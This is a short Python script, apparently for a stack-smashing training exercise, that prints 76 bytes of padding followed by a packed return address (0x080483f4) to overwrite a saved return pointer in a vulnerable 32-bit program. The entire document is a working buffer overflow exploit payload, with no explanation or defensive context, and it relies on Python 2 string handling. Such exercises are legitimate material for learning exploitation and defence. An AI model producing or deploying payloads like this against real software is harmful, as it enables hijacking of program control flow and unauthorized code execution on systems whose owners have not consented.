import struct
padding = "a" * 76
address = struct.pack("I", 0x080483f4)
print(padding + address)
